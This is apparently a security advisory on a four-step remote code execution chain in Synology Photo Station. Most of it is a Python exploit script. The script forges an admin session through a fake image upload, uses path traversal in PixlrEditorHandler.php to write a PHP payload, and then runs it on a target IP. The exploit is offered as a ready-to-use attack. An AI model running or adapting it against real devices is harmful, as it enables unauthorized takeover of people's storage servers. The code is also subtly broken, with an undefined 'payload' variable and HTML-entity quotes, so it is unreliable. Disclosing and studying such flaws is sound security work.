Source: https://blogs.securiteam.com/index.php/archives/3356
 
Vulnerability details
The remote code execution is a combination of 4 different vulnerabilities:
 
Upload arbitrary files to the specified directories
Log in with a fake authentication mechanism
Log in to Photo Station with any identity
Execute arbitrary code by authenticated user with administrator privileges
The chain of vulnerabilities will allow you, in the end, to execute code as:
 
uid=138862(PhotoStation) gid=138862(PhotoStation) groups=138862(PhotoStation)
&#039;&#039;&#039;
import requests
 
# What server you want to attack
synology_ip = &#039;http://192.168.1.100&#039;
 
# Your current IP
ip = &#039;192.168.1.200&#039;
 
# PHP code you want to execute
php_to_execute = &#039;<?php echo system("id"); ?>&#039;
 
encoded_session = &#039;root|a:2:{s:19:"security_identifier";s:&#039;+str(len(ip))+&#039;:"&#039;+ip+&#039;";s:15:"admin_syno_user";s:7:"hlinak3";}&#039;
 
print "[+] Set fake admin sesssion"
file = [(&#039;file&#039;, (&#039;foo.jpg&#039;, encoded_session))]
 
r = requests.post(&#039;{}/photo/include/synotheme_upload.php&#039;.format(synology_ip), data = {&#039;action&#039;:&#039;logo_upload&#039;}, files=file)
print r.text
 
print "[+] Login as fake admin"
 
# Depends on version it might be stored in different dirs
 
try_login = requests.post(&#039;{}/photo/include/file_upload.php&#039;.format(synology_ip), params=payload)
 
whichact = {&#039;action&#039; : &#039;get_setting&#039;}
r = requests.post(&#039;{}/photo/admin/general_setting.php&#039;.format(synology_ip), data=whichact, cookies=try_login.cookies)
print r.text
 
print "[+] Upload php file"
 
c = {&#039;action&#039; : &#039;save&#039;, &#039;image&#039; : &#039;data://text/plain;base64,&#039;+php_to_execute.encode(&#039;base64&#039;), &#039;path&#039; : &#039;/volume1/photo/../../../volume1/@appstore/PhotoStation/photo/facebook/exploit&#039;.encode("base64"), &#039;type&#039; : &#039;php&#039;}
r = requests.post(&#039;{}/photo/PixlrEditorHandler.php&#039;.format(synology_ip), data=c, cookies=try_login.cookies)
print r.text
 
 
print "[+] Execute payload"
f = requests.get(&#039;{}/photo/facebook/exploit.php&#039;.format(synology_ip))
 
print f.text

